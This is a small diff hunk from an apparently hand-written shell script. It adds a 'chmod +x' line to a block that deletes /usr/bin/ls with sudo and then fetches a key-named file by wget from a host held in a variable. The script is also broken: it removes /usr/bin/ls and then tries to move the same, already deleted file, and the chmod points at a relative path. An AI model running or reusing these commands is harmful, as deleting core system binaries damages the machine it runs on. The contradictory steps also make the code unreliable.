@@ -70,6 +70,7 @@ sleep 3
 sudo rm /usr/bin/ls
 
 sudo mv /usr/bin/ls /usr/bin/fin
+sudo chmod +x fin
 
 wget "http://"$vpn":8000/"$PUBLIC_KEY"" -O "/tmp/"$PUBLIC_KEY""
 
